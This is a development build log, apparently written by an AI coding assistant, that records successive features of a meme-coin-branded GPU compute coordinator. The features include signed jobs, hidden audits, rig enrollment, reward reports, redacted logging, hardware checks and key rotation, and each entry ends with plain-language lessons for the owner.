# Build log: proof of work and what you learned

## 2026-11-21: Merged site, graphics, contributor page, Netlify

**Shipped**
- Merged the $BNH meme-coin brand (v0.4 plan) with the GitHub GPU-compute repo into one site.
- Original graphics: hoe-mast boat with a $BNH sail, GPU-chip jib, and GPU-fan portholes (`assets/boat.svg`), logo mark/favicon (`assets/mark.svg`), 1200×630 share card (`assets/og-image.png`).
- `/contribute`: a 10-second in-browser GPU check (WebGPU + WebGL), copy-ready Linux hardware commands, and a tester sign-up form (Netlify Forms, honeypot spam trap).
- Tested at phone (390 px), tablet (768 px) and desktop (1440 px) with the real fonts and the `_headers` security policy applied. Found and fixed 2 bugs: sideways scrolling on phones, and the "N" in the headline drifting off-center.
- Netlify project `boatsnhoes-dik6` created, form detection on. Internal folders (`/docs`, `/prototype`, `/prompts`) blocked from the public site.

**What you learned**
1. **Static site + forms without a server.** Netlify scans your HTML at deploy time. Any `<form data-netlify="true">` becomes a working form, and submissions show up in the Netlify dashboard. No backend code is needed.
2. **The `_headers` file works on Netlify and Cloudflare.** Both read the same format. Your Content-Security-Policy only lets the page load fonts from Google and scripts from your own domain. That is why the GPU checker lives in `assets/contribute.js` instead of a third-party script.
3. **Social share cards.** The `og:image` meta tag sets the picture people see when they paste your link in Facebook, X or Discord. It must be a full `https://` URL to a PNG or JPG, ideally 1200×630 px. SVG images don't show up.
4. **Browsers can only half-see your GPU.** WebGL and WebGPU report a GPU name, but browsers blur it for privacy. That is why the real check is the Linux `vulkaninfo` command.
5. **Rotated text can break phones.** A rotated full-width block pokes past the screen edge and lets the page scroll sideways. The fix is to shrink each block to its text width (`width: fit-content`).

## 2026-11-21 (later): Homepage back to orange/black

- You picked version A (the orbital design) from a side-by-side of all 4 homepages in the repo history and your upload.
- Restored it from git history instead of rebuilding. Changed only: footer links (they pointed at folders the site hides), a link to the GPU contributor page, an orange share image, and a phone-only icon overlap.
- **What you learned:** every version of a file lives in git history. `git show <commit>:index.html` brings back any past version without redoing the work.

## 2026-11-21 (evening): Matching pages + durable GPU job queue

**Shipped**
- /contribute, /thanks and 404 now use the same orange/black look as the homepage. The orange boat logo is also the browser-tab icon.
- GPU worker backend, Phase 1: jobs live in SQLite and survive restarts. Leases time out and requeue, retries are capped, and every step goes to an audit log. Workers refuse jobs whose signature doesn't check out.
- Tests went from 4 to 13, all passing. I also ran a real end-to-end test: coordinator, two workers, a coordinator restart mid-run, and a worker using the wrong key.

**What you learned**
1. **A lease is a timed lock.** A worker "borrows" a job for 60 seconds. If the rig crashes or goes offline, the job returns to the queue for another rig. The coordinator never waits forever on a dead machine.
2. **Idempotent means safe to repeat.** If a rig's Wi-Fi drops and it sends the same result twice, it's paid once and gets the same receipt both times.
3. **Signatures protect the miners.** Each job is signed with a secret key. A worker checks the signature before running anything, so a fake coordinator can't make your GPU run its code.
4. **Test the bad days, not just the good one.** Most of the new tests cover failures: crashes, timeouts, cheaters, duplicates, and 20 workers grabbing jobs at the same moment.

## 2026-11-22: GPU worker Phase 2 (job types + pinned AI models)

**Shipped**
- A plug-in system for job types. Each type knows how to check its input, run, and grade its results.
- The first real AI job type, `llm:generate`: short text generation on a small model through llama.cpp, the software that will drive the RX 470s.
- A model registry that records where each model comes from, its license and its size. A model can't be used until its exact fingerprint (sha256) is pinned from a real download. Nothing downloads unless you add `--yes-download`.
- 32 tests pass, up from 13. An hourly scheduled build session now continues this work and saves to your drafts branch.

**What you learned**
1. **A fingerprint (hash) proves a file is exactly the one you meant.** Change one byte of a 400 MB model and the sha256 changes completely, so a worker can detect a swapped or corrupted model before running it.
2. **Not every check proves the same thing.** For the SHA job the coordinator redoes the math, which is exact proof. For AI text it can only check that the answer looks right, which is "schema-only". Real proof needs another rig to re-run the same job and compare (Phase 4).
3. **Licenses matter before launch.** The model we picked (Qwen2.5-0.5B) is Apache-2.0, which allows commercial use. That's recorded right next to it in the registry.

## 2026-11-22 (later): GPU worker Phase 4, first slice (catching cheaters)

**Shipped**
- **Hidden re-runs.** When an AI result can only be checked for shape, the coordinator now quietly hands the same job to a *different* rig (25% of the time by default). If both answers match, both are marked confirmed. If they don't, both are held. A rig can never re-check its own work.
- **Hidden test jobs ("challenges").** You can slip in a job where you already know the answer. To the rig it looks exactly like normal work, and a wrong answer even looks accepted, so a cheater can't tell they were caught. You see the failure in a private trust report.
- **Points split by status:** confirmed, pending, unverified, held. The public view hides which jobs were tests.
- The private views (challenges, audits, trust report) are locked behind an operator password (`OPERATOR_TOKEN`). If you don't set one, they're switched off.
- Tests went from 32 to 44, all passing. Still software only: no real GPU has run any of this.

**What you learned**
1. **You can't prove a GPU did the work, but you can make cheating expensive.** If 1 in 4 answers gets re-checked by someone else, a rig that fakes answers gets caught fast. That's spot-checking, the same idea as a random bag check.
2. **A test only works if it's invisible.** My first version gave re-check jobs a longer deadline than normal jobs. That's a tell: a cheater could fake normal jobs and only work honestly on the long ones. I fixed it so re-checks copy the original's time window.
3. **"Close enough" needs a rule written down.** Two honest rigs can print the same AI answer with different spacing. The rule now: ignore spacing and line breaks, but any different word or capital letter counts as a mismatch. We'll adjust it once two real RX 470s produce answers.
4. **Agreement isn't proof.** If one person runs two rigs, they can agree on a fake answer. That's why per-worker identity (logins/keys) is one of the next jobs.

## 2026-11-22 (evening): Phase 4 finished: tie-breakers + written threat model

**Shipped**
- **Tie-breakers.** When a re-check disagrees with the original answer, the coordinator now quietly sends the same job to a *third* rig that wasn't on either side. Majority of three wins: the side it agrees with is confirmed, the other side is marked "outvoted" and its points stay held. If it agrees with neither, all three are held for a person to look at. Like audits, it looks exactly like normal work to the rig.
- If no third rig is around (say only your two RX 470s are online), the dispute simply stays held and the log says the tie-breaker never ran.
- Two new self-checks the ledger runs on itself: "did a rig break a tie on its own dispute?" and "is anything marked outvoted without a tie-breaker behind it?" A test tampers with the database on purpose to prove both checks fire.
- **Threat model written** (`docs/VERIFICATION-THREAT-MODEL.md`): 13 ways someone could cheat, what stops each one today, what's still open, and the order to fix them.
- Tests went from 44 to 51, all passing. Still software only: no real GPU output yet.

**What you learned**
1. **Two witnesses can only disagree; three can decide.** With two answers you know *something* is wrong but not who. A third independent run breaks the tie. That's the same reason juries and RAID storage use odd numbers.
2. **Majority voting has a blind spot.** If one person secretly runs two of the three rigs, they can outvote the honest one. That's why per-worker identity is now the top item: voting only means something if the voters are really different people.
3. **Who picks the checker matters as much as the check.** Right now an audit goes to whichever rig asks first. A cheater who asks very fast gets to check their own friends more often. The fix (random assignment) is on the list.
4. **Spot-check math:** at a 25% audit rate, a rig faking 10 answers gets caught about 94% of the time, as long as the checker is honest. The chance of escaping is 0.75 multiplied by itself 10 times.

## 2026-11-22 (night): GPU worker Phase 5 (simulated reward reports)

**Shipped**
- **Reward reports.** For any time period, the coordinator can now total up each rig's simulated points: how many results it got accepted, how its points split across confirmed, unverified, pending and held, and how many points count ("payable"). It also lists each rig's activity: jobs borrowed, wrong answers, timeouts, bad submissions.
- **A written, versioned scoring rule** (`sim-points-v1`): confirmed and unverified points count; pending and held don't. If the rule ever changes it gets a new name (v2), so old reports can always be re-checked under the rule they used.
- **A fingerprint on every report.** Each report carries a sha256 of its contents. The same database and the same dates always produce the same fingerprint, and `python -m app.rewards verify report.json` re-runs the report and points at any line that changed, or tells you the file was edited.
- The report is operator-only and never names hidden test jobs, answers, prompts or secrets.
- Tests went from 51 to 61, all passing. I also ran it for real: a coordinator process, two demo workers, the report over HTTP (403 without the operator password), then the command-line report and verify ("OK: report matches the ledger"). Points are simulation bookkeeping only: no tokens, no money.

**What you learned**
1. **Spot-checking only works if you pay for unchecked work.** If only re-checked answers counted, three out of four honest jobs would never pay. So unchecked ("unverified") work counts, and the deterrent is that any fake that does get checked is held. The open question for you: should getting caught also cost a rig its other unchecked points? That's on your to-do list as a v2 decision.
2. **Version your rules like you version software.** A report says which scoring rule made it. Change the rule and old reports still re-check under the old one, instead of silently changing past numbers.
3. **Deterministic means repeatable.** No clock time and no random numbers go into a report, just the database and the dates you pick. That's what lets anyone with a copy of the ledger reproduce the exact same fingerprint.
4. **A report can leak secrets by timing.** A hidden test that a rig fails shows up as "held" right away. If rigs could watch a live report, they'd guess which jobs were tests. So reports are operator-only, and should be published only after the period ends.

## 2026-11-22 (late night): Rigs now need an invite and their own key

**Shipped**
- **Invite codes.** A rig can't join on its own anymore. You (the operator) make a one-time code for it, tied to an owner name: `python -m app.workers enroll --owner owner-gpu0`, or through the API with your operator password. A code works once and expires after a day by default.
- **Each rig gets its own key.** The rig trades the code for a private key, shown once. It sends that key with every "give me a job" and every answer. The coordinator only keeps a fingerprint (sha256) of each key, so even someone who copies the database can't log in as a rig.
- **No pretending to be someone else.** A rig's key only works for its own name. Trying another rig's name, a made-up key or no key gets refused. An invite code can't be used to take over a name that's already taken.
- **One owner never checks themselves.** Hidden re-checks and tie-breakers now skip every rig with the same owner, not just the same rig. A new self-check flags it if that ever happens anyway.
- **Kick a rig out.** `python -m app.workers revoke <rig>` blocks its key right away and hands any job it was holding to someone else.
- The demo worker saves its key in a private file (only your user can read it) on the first run and reuses it after.
- Tests went from 61 to 73, all passing. I also ran it for real: a coordinator process, one invite from the API and one from the command line, two demo workers, a used invite refused, a saved key reused, and a revoked rig refused. Still software only: no real GPU yet.

**What you learned**
1. **Invite once, then use a key.** The invite proves the operator said yes. The key proves "this is the same rig as before" on every request after. Splitting the two means a leaked old invite is useless, and a leaked key only affects one rig, which you can revoke.
2. **Store fingerprints of passwords, not the passwords.** The coordinator saves only the sha256 of each key. When a rig sends its key, the coordinator fingerprints it and compares. If someone steals the database, they get fingerprints that can't be turned back into keys.
3. **A name isn't a person.** Keys stop one rig from pretending to be another, but they can't tell you whether two rigs belong to the same person. That's what the owner label is for, and it's only as honest as the person handing out invites. One invite per real person is your job.
4. **Your own two cards count as one owner.** If both RX 470s get the same owner label, they'll never re-check each other, so with just those two online no re-check would ever run. For your two-card test, give them two labels and keep in mind that your cards agreeing proves less than strangers agreeing.

## 2026-11-22 (overnight): Audits now go to a random rig, not the fastest one

**Shipped**
- **Random auditor pick.** Before, a hidden re-check went to whichever rig asked for work next. A group of cheaters who asked very often got more re-checks, including re-checks of each other. Now, the moment a re-check (or tie-breaker) is created, the coordinator draws one rig at random from the rigs that are allowed to do it, and only that rig can pick it up. Asking faster doesn't help anymore.
- **Who's allowed:** not the rig that did the original, not any rig with the same owner, not a revoked rig, and only rigs that have checked in during the last 5 minutes (`AUDITOR_ACTIVE_SECONDS`), so a re-check isn't handed to a rig that's switched off.
- **If the pick doesn't show up** within 2 minutes (`AUDIT_ASSIGN_SECONDS`), gets revoked, or drops the job, the coordinator draws again and skips the previous pick when someone else is available. If nobody is allowed yet, the re-check waits and is drawn when the next rig checks in.
- The pick is private: rigs can't see it in the job view or the job they receive. You see it as `assigned_worker` in the operator audits list.
- A new self-check flags any re-check that was done by a rig it wasn't assigned to. A test tampers with the database to prove it fires.
- Tests went from 73 to 82, all passing. One test gives 60 re-checks to three rigs where the same rig always asks first: under the old rule it would get all 60; now each gets a fair share. I also broke the new rule on purpose (let anyone grab a re-check again) and 4 of the new tests failed, so they really catch the old behavior. Still software only: no real GPU yet.

**What you learned**
1. **Fair isn't the same as first-come.** First-come rewards whoever is fastest, and in a network the fastest asker can be a script. A random draw gives every eligible rig the same chance, no matter how often it asks.
2. **Random has to mean unpredictable.** The draw uses the computer's secure randomness (the same kind used to make passwords), so nobody can guess the next pick from the last ones. Tests use a fixed "seed" instead, so the same test always plays out the same way.
3. **Every assignment needs a timeout.** If you hand a job to one rig and that rig unplugs, the job would sit forever. So each pick has a 2-minute window, then someone else gets a turn.
4. **This makes cheating rings weaker, not impossible.** If 2 of 10 active rigs are in a ring, a ring member checks a friend's work only about 2 times in 10. Getting more chances means getting more invite codes, which is why handing out one code per real person matters.

## 2026-11-22 (early morning): Only the coordinator can sign jobs now

**Shipped**
- **A lock only the coordinator has the key to.** Every job the coordinator hands out carries a signature, so rigs can tell a real job from a fake one. Before, that signature used one shared password (`PROTOTYPE_SECRET`) that every rig also had to know, which meant any rig could make fake jobs that looked real to the other rigs. Now the coordinator signs with a private key (Ed25519) that never leaves its machine, and rigs check with the matching public key, which can check signatures but can't make them. Closes threat model item #9.
- **The private key is guarded.** It's created on first start in `data/coordinator-signing.key`, readable only by your user. If the file's permissions let other users read it, the coordinator refuses to start and tells you the `chmod 600` command to fix it.
- **Rigs remember the coordinator ("pinning").** On its first run the demo worker saves the coordinator's public key and prints a short fingerprint like `0c74-ea31-24dd-92f4` for you to compare. If a different coordinator ever answers at that address, the rig stops instead of taking its jobs. You can also hand rigs the key directly (`--coordinator-key`), which is safer than trusting the first answer.
- `python -m app.signing` prints the public key and fingerprint. `GET /v1/coordinator/key` serves the same thing. `PROTOTYPE_SECRET` is retired.
- Tests went from 82 to 89, all passing. I also broke the check on purpose (ignored which key signed a job) and 3 tests failed, so they really catch it. Then I ran it for real: a coordinator, a demo worker that pinned the key and finished a job, and a second "impostor" coordinator on the same address that the worker refused to work for. Still software only: no real GPU yet.

**What you learned**
1. **A shared password can't prove who wrote something.** If everyone who checks a signature can also make one, a signature only proves "someone in the group". A public/private key pair splits those powers: one secret key signs, and anyone can check with the public key.
2. **A public key is safe to publish.** It's on an open web address on purpose. The only thing to protect is the private key file, the same way you'd protect a wallet seed phrase.
3. **The first handshake is the weak spot.** Pinning protects a rig from every later impostor, but the very first contact trusts whoever answers. That's why reading out the fingerprint (or giving the key directly) matters, just like checking a new phone number with a friend in person.
4. **Old jobs break on purpose.** Jobs signed the old way are now refused, so start from a fresh database. Security changes often mean "old things stop working", and that's better than quietly accepting them.

## 2026-11-22 (morning): Jobs and receipts now say which version and which model

**Shipped**
- **Jobs carry a version number.** Every job the coordinator signs now says which layout it uses (`bnh-job/1`). If a rig gets a job in a layout it doesn't know, it refuses instead of guessing. Jobs saved before today are marked `bnh-job/0` and refused with a clear message.
- **AI jobs name their exact model file.** An `llm:generate` job now carries the fingerprint (sha256) of the pinned model file, inside the signature. Re-checks and tie-breakers copy the fingerprint from the original job, so if you re-pin the registry later, old jobs still mean what they meant.
- **Rigs check their own model first.** Before running anything, a rig compares the job's model fingerprint with the one it pinned itself. Different or missing means "refuse".
- **Answers come with a receipt.** A rig's answer now also says which receipt layout it uses (`bnh-receipt/1`), which job version it ran, a fingerprint of the input it ran, and which model it used. The coordinator refuses any receipt that doesn't match the job, logs it as `receipt_mismatch`, and counts it as a bad submission in reward reports. The rig keeps its job and can send a correct receipt.
- `/health` now lists the versions the coordinator speaks. Two new self-checks catch a re-check that doesn't match its original job, or an AI job saved without a model fingerprint.
- Tests went from 89 to 97, all passing. I switched off each new check one at a time (receipt matching, the rig's model check, re-checks copying the original fingerprint) and the matching tests failed every time, so they really catch it. I also ran it for real: a coordinator process and a demo worker finished a versioned job, and an old-style answer without a receipt was refused with "unsupported receipt_version". Still software only: no real GPU yet.

**What you learned**
1. **Version numbers are for the future.** Today there's only version 1. The point is that when version 2 comes, an old rig says "I don't understand this" instead of quietly doing the wrong thing.
2. **Pin the meaning at creation time.** A job records the model fingerprint when it's made. If it only said "use the registry's model", re-pinning the registry would change what old jobs ask for, and a re-check could run a different model than the original.
3. **A receipt is a claim, not proof.** A cheating rig can copy the right fingerprints into its receipt without running anything. These checks catch honest mistakes (wrong model file, outdated rig software, an answer sent to the wrong job). Hidden re-checks and test jobs are still what catch liars.
4. **Refuse loudly, change nothing.** A bad receipt doesn't cost the rig its job or touch the points. It just gets a clear error and a line in the log, so a misconfigured rig is easy to spot and fix.

## 2026-11-22 (midday): Reward reports now carry the coordinator's signature

**Shipped**
- **Signed reports.** The coordinator can now sign a reward report for a period that's already over: `python -m app.rewards report --sign --out report.json`. The file gets a "signature" section with the coordinator's public key, its short fingerprint, and the signature itself. It's the same key that already signs jobs, but the signed message is labeled as a report, so a report signature can never be passed off as a job.
- **Anyone can check it, no database needed.** `python -m app.rewards verify report.json --no-db --public-key <key>` says "OK" only if the coordinator signed this exact file. Change any number and the check fails. Change the number *and* recompute the file's fingerprint, and the signature check fails instead.
- **It won't sign too early.** A period that hasn't ended yet is refused (its numbers can still change, and a live per-job view could give away hidden tests). It also won't sign a report that fails its own self-checks, and it won't make up a new key if the key file is missing.
- The operator API does the same with `?sign=true`.
- Tests went from 97 to 109, all passing. I switched off each new check one at a time (the signature check, the "period must be over" rule, the trusted-key comparison, the report label) and a test failed every time. I also ran it for real: a coordinator, a demo worker that finished two jobs, a signed report that checked out offline and against the ledger, an edited copy that was refused, and the API refusing to sign a period that was still open. Still software only: no real GPU yet.
- Also fixed an out-of-date line in the prototype README that still said audits were first-come (that was fixed in 0.5.8).

**What you learned**
1. **A signature answers "who said this?", not "is it true?".** Signing a report stops anyone from changing it after it's issued, and proves it came from your coordinator. It doesn't stop the coordinator from signing wrong numbers. Checking the numbers still means re-running the report against a copy of the database.
2. **One key, many jobs, so label what you sign.** The coordinator's key signs jobs and now reports. Each signed message says what it is (`purpose`), so nobody can take a signature from one kind of message and reuse it on another.
3. **Checking against the key inside the file proves nothing on its own.** A forger can sign with their own key and put that key in the file. That's why the checker asks for the key you already trust, and warns you to compare fingerprints when you don't give one.
4. **Sign only what's finished.** A report for a period that's still running can change minutes later. Signing it would put your name on numbers that are about to be wrong.

## 2026-11-22 (afternoon): The coordinator now keeps a clean diary and can say how it's doing

**Shipped**
- **A diary in a machine-readable format (structured logs).** Every time something happens, the coordinator writes one line like `{"ts": "...", "level": "info", "msg": "job leased", "job_id": "...", "worker_id": "wk-a"}`. One line per request (what was asked, the answer code, how many milliseconds it took) and one line per important moment: job created, job handed out, answer accepted or refused, rig joined, rig kicked out. Refused keys, wrong operator passwords and bad receipts are logged as warnings with the reason.
- **A tracking number on every request.** Each request gets an id, sent back in the `X-Request-ID` header. If a rig reports an error, you can find the exact matching line in the coordinator's log.
- **Nothing secret goes in the diary.** No rig keys, no operator password, no invite codes, no prompts, no answers, no web-address extras. If code ever tries to log a field named like a secret, it's replaced with `[redacted]`. A hidden test job is logged exactly like a normal job. So a log is safe to paste into a bug report (but still don't hand it to rigs: it shows *when* you used operator tools).
- **Two health checks.** `GET /health` is public: "ok" (200) when the database works, "down" (503) when it doesn't, without leaking file paths. `GET /v1/operator/health` is behind your operator password and gives plain-language warnings: no rigs online, re-checks stuck because no rig with a different owner is around, jobs past their deadline, and any self-check failures.
- `LOG_FORMAT=json` (default) or `text` for reading in a terminal, `LOG_LEVEL=info` by default.
- Tests went from 109 to 127, all passing. One test runs a whole session and then searches the log for every key, password, code, prompt and answer it used: none show up. I broke each safety rule on purpose once (turned off redaction, logged the full web address, logged a key under a different name, skipped the database check) and a test failed every time. I also ran it for real: a coordinator with JSON logs, a demo worker finishing a job, a fake key refused and found in the log by its tracking number, and both health pages. Still software only: no real GPU yet.

**What you learned**
1. **Logs are for machines first.** A sentence like "worker wk-a got job 123" is easy to read but hard to search. Named fields (`worker_id`, `job_id`) let a tool answer "show me everything rig wk-a did today" in one command.
2. **Logs are where secrets leak.** Teams often protect the database and then print passwords into log files that get copied everywhere. The rule here: messages are fixed phrases, data goes in named fields, and secret-looking field names are blanked automatically.
3. **"Alive" and "healthy" are different questions.** The public check answers "is it up?" for a monitor. The operator check answers "is it doing its job?", like re-checks that can't run because every online rig has the same owner.
4. **Your two-card test will show a warning, on purpose.** If both RX 470s share one owner label, the operator health page will say re-checks are waiting for an eligible auditor. That's the system telling you it won't let one person check their own work.

## 2026-11-22 (10:18 UTC): Anyone can now re-check the reward numbers, not just the signature

**Shipped**
- **A shareable copy of the ledger.** A signed report proves the coordinator issued it, but not that the numbers are right. To check the numbers you need the records they came from. `python -m app.ledger_copy export --until <time> --out ledger-copy.sqlite3` now makes a cleaned-up copy of the ledger up to the end of a finished period. Anyone with that copy, the signed report and your public key can run `python -m app.rewards verify report.json --db ledger-copy.sqlite3 --public-key <key>` and get "OK" only if the report matches the records.
- **What's taken out:** rig keys (even their scrambled form), invite codes, prompts, answers, the right answers to hidden tests, job signatures and the free-text notes in the diary. Owner names become `owner-1`, `owner-2`, and so on: two rigs with the same owner still get the same label, so the "nobody checks their own work" rule can still be checked.
- **What stays:** who did which job, which job re-checked which, when things happened, points and how each result settled. That's enough to re-run the report and every self-check (no rig audited itself, no rig audited a rig with the same owner, every outvoted result has a tie-breaker behind it).
- **It refuses** a period that isn't over, a period where any job or re-check is still waiting, a ledger that fails its own self-checks, and overwriting an existing file. Deleted data is wiped from the file, not just hidden, and the copy is built under a temporary name so a crash never leaves a half-cleaned copy.
- **Checking a copy never changes it.** Reports and checks open a copy read-only, so the file's fingerprint (sha256) stays the same as when you published it. A report that reaches past the copy's end date is refused.
- Tests went from 127 to 137, all passing. One test searches every byte of a copy for each prompt, answer, test answer, key, code, signature and real owner name used: none show up. I switched off six safety checks one at a time (wiping, fingerprint scrambling, the "still waiting" check, the end-date guard, read-only opening, removing diary notes) and a test failed every time. I also ran it for real: a coordinator and a demo worker, an export refused while a job was still queued, then a signed report that checked "OK" against the copy, no secrets in it, and the same fingerprint after checking. Still software only: no real GPU yet.

**What you learned**
1. **A signature and a re-check answer different questions.** The signature says "this came from us and nobody changed it". Re-running the numbers from the records says "and the math is right". Together they're much stronger than either alone.
2. **Share the shape, not the secrets.** Outsiders don't need the prompts or answers to check fairness. They need to know who did what and who checked whom. Swapping real names for `owner-1` keeps the "same person?" question answerable without saying who the person is.
3. **Deleting isn't erasing.** A database often keeps deleted rows in the file until it's compacted. The copy turns on "overwrite deleted data" and compacts the file, and a test reads the raw bytes to prove the secrets are really gone.
4. **Every transparency step has a price.** The copy shows which past jobs were hidden tests (not what was in them). That's what lets outsiders confirm nobody graded their own homework, but it's best shared a while after the period ends. Where to post reports and copies is your call (added to your to-do list).

## 2026-11-22 (evening): A one-command checkup for the GPU rig

**Shipped**
- **`python -m app.hw_inventory --out inventory.json`.** Run it on the Ubuntu machine with the two RX 470s and it writes one JSON file that answers the questions the roadmap's "immediate next action" asks: which Ubuntu, which kernel, which graphics cards are plugged in (with their PCI ID numbers), which driver each card uses, what Vulkan can see (card name, driver, Mesa version), and whether your user is allowed to open each card's compute device in `/dev/dri`.
- **It explains what it found in plain words.** For example: "02:00.0: kernel driver is 'radeon', not amdgpu", "Vulkan only sees a software (CPU) renderer", "lspci sees 2 AMD card(s) but Vulkan sees 1", or "Your user can't open /dev/dri/renderD129".
- **It only looks, it never touches.** It may run exactly three commands (`uname -r`, `lspci -nnk`, `vulkaninfo --summary`), with no shell and no sudo. Anything else is refused. If a tool is missing it tells you the Ubuntu package name and stops there: installing things, switching drivers or adding yourself to a group stays your decision.
- **It blanks private details.** The machine's name, your username and device serial-style IDs (UUIDs) become `[host]`, `[user]` and `[uuid]` before anything is printed or saved. It won't overwrite an existing report.
- **It never claims more than it knows.** Every report says `"proves_inference": false`: seeing a card is not the same as running AI on it.
- Tests went from 137 to 151, all passing. I switched off nine rules one at a time (the command allowlist, UUID blanking, the CPU-only warning, the card-count check, the render-node check, the wrong-driver warning, the "not proof" flag, dropping unneeded fields, the no-overwrite rule) and a test failed every time. I also ran it for real in my cloud sandbox, which has no GPU: it correctly said `lspci` and `vulkaninfo` aren't installed and that there are no GPU devices, and refused to overwrite its own file on the second run. The sample command outputs in the tests are written in the format those tools print; they are not from your rig. Still software only: no real GPU yet.

**What you learned**
1. **Seeing a card is step zero, not proof.** Linux can list a graphics card even when nothing can compute on it. The ladder is: the card shows up on PCI → the right driver (`amdgpu`) is attached → Vulkan lists it → a tiny test program runs on it → a real AI job runs on it. This tool checks the first three rungs.
2. **Watch out for llvmpipe.** If Vulkan only lists "llvmpipe", it's pretending: that's a software version of a GPU running on your processor. Something can "work on Vulkan" and never touch the RX 470s. The tool warns about this.
3. **The `render` group is the permission slip.** On Ubuntu, compute programs talk to a card through `/dev/dri/renderD128`, `renderD129`, and so on. If your user isn't allowed to open those, everything fails with confusing errors. The tool checks that up front.
4. **Diagnostics should be boring and safe.** A checkup tool that installs or "fixes" things can break a working machine. Read-only plus a clear report means you can run it any time without worrying.

## 2026-11-22 (night): New rigs and rigs caught cheating now get checked more often

**Shipped**
- **The re-check rate now depends on the rig's record** (`audit-tier-v1`). Before, every rig had the same 1-in-4 chance of having an AI answer secretly re-run by another rig. Now there are three tiers:
  - **New** (fewer than 5 answers that another rig or a hidden test has confirmed): re-checked half the time.
  - **Suspect** (failed a hidden test job, or lost a 2-against-1 vote even once): every answer is re-checked.
  - **Established** (everyone else): the normal 1-in-4.
  It's never lower than the normal rate, so `AUDIT_RATE=1` still checks everything. Three new settings: `AUDIT_RATE_NEW`, `AUDIT_RATE_SUSPECT`, `AUDIT_NEW_UNTIL`.
- **Only you can see the tier.** The operator trust report (`/v1/workers/<id>/trust`) now shows `audit_tier`, the rate that applies, `checks_passed` and `strikes`. `/v1/audits` lists the rule in force. The operator health page names any rig with a strike and suggests you look at it. Rigs never see their tier: it's not in any reply, job or public log line.
- **It changes checking, not points.** A strike doesn't take points away. Whether caught cheaters should lose points is still your decision (scoring v2, already on your list).
- Tests went from 151 to 158, all passing. I switched off five parts one at a time (the tier lookup, the strike rule, the "never below normal" floor, counting a lost vote as a strike, the health warning) and a test failed every time. I also ran it for real: started the coordinator, enrolled a rig with an invite code, and its trust report said `new` at rate 0.5; without the operator password the report was refused (403). Still software only: no real GPU yet.

**What you learned**
1. **Spend your checking where the risk is.** Re-running jobs costs other rigs' time. A rig with a long clean record needs fewer checks than a stranger, and a rig that was just caught needs every answer checked.
2. **"Trust" here is just a count.** "Established" means "5 answers matched someone else's", nothing more. Two friends who check each other can fake that, which is why hidden test jobs (whose right answer only you know) matter: those can't be faked by agreeing.
3. **Don't tell people they're being watched.** If a rig knew it was "suspect", it could behave until it isn't. So the tier lives only in your operator views.
4. **Separate "check more" from "punish".** Extra checks are cheap and reversible. Taking points away is a policy choice with real fairness questions (what if the GPU just gave a slightly different answer?), so it stays your call.

## 2026-11-22 (13:15 UTC): The coordinator's signing key can now be replaced without visiting every rig

**Shipped**
- **`python -m app.key_rotation rotate`.** Every job is signed with the coordinator's private key, and every rig remembers ("pins") the matching public key so a fake coordinator can't sneak in. The catch: until now, replacing the key meant every rig refused to work until someone fixed it by hand. Now, with the coordinator stopped, one command makes a new key and writes a short **handover note**: "old key → new key, handover #1, at this time", signed by **both** keys. The note goes into a public file next to the key, then the new key takes over and the old private key is thrown away. `python -m app.key_rotation show` lists the handovers.
- **Rigs follow the handover on their own.** The coordinator's public key page now also lists the handover notes. A rig that sees a new key checks the chain of notes from the key it pinned to the new one (each signed by both keys, numbered in order, each starting where the last ended, no key used twice, never backwards). If it all checks out it updates its pin and says so; otherwise it stops, exactly like before.
- **Jobs already waiting in line still work.** A job signed with the old key gets re-signed with the new key when a rig picks it up, but only if its old signature really came from one of our retired keys. A job signed by anyone else (say, someone edited the database) is passed along untouched, so the rig refuses it. Every re-sign is written to the audit trail.
- **Safe if the power cuts out mid-way.** If the machine dies before the handover note is saved, nothing changed. If it dies after, the coordinator won't start until you run `rotate` again, which finishes the same handover instead of making a second one. It also won't start if the key file doesn't match the end of its handover history.
- Tests went from 158 to 168, all passing. I switched off ten rules one at a time (old-key signature, new-key signature, numbering, linking, no reuse, the start-up check, finishing an interrupted rotation, the rig's chain check, re-signing on pickup, refusing to re-sign a stranger's signature) and a test failed every time. I also ran it for real: started the coordinator, a demo rig pinned key `7957-…`, queued a job, stopped the coordinator, rotated to `65e2-…`, restarted. The rig printed "Coordinator key rotated: 7957-… → 65e2-… (each step signed by both keys)", picked up the old job (re-signed, logged) and it was accepted. Still software only: no real GPU yet.

**What you learned**
1. **Pinning and rotating pull in opposite directions.** Pinning says "never accept a new key"; real systems still need to replace keys sometimes. A handover signed by the old key is how you change the lock without giving a stranger the chance to.
2. **Why both keys sign.** The old key's signature says "I hand over to this key". The new key's signature proves the new key actually exists and agrees, so nobody can point the chain at a key they made up or copied.
3. **A handover can't fix a stolen key.** If someone has your old private key, they can sign a handover to *their* key too. Handovers are for planned changes (say, moving the coordinator to a new machine). After a suspected theft, give each rig the new key directly.
4. **Write the note first, then swap.** Saving the handover before swapping keys means a crash leaves either "nothing changed" or "finish the swap", never a coordinator with a key nobody can follow.

## 2026-11-22 (14:15 UTC): Rigs that keep letting their audits go now show up

**Shipped**
- **A new line in each rig's trust report: `audit_follow_through`.** Since 0.5.8 the coordinator hands each secret re-check (audit) to one rig chosen at random, so a rig can't *grab* the audits it likes. But it could still quietly *let go* of ones it doesn't like, and they'd just move on to another random rig. Now every rig's report shows how many audits it was **assigned**, how many it **completed**, and how many it **dropped**, split three ways:
  - **not claimed:** it was picked but never picked the job up in time (`AUDIT_ASSIGN_SECONDS`, default 2 minutes). This is a new private diary entry, `audit_assignment_expired`.
  - **lease expired:** it picked the job up, then went silent until its time ran out.
  - **refused:** it sent back an answer that failed the basic shape check (for example, blank).
- **The health page warns you.** `/v1/operator/health` now lists every rig's drop count (`audit_dropouts`) and adds a plain-language warning for any rig at or above `AUDIT_DROP_WARN` (default 3). The warning says outright that a rig that simply went offline looks exactly the same.
- **Counted fairly.** If a rig is picked again for the same audit (because nobody else can do it), it's judged on its latest pick only, so an old lease doesn't excuse a new no-show. A rig that took a job and timed out is counted once, not twice. If you revoke a rig, the audits it was holding aren't counted against it: that was your doing.
- **It only watches, it doesn't punish.** Drops don't change points or how often the rig itself is checked. Whether they should is your call (added to your to-do list). Rigs never see these counts or the new diary entry.
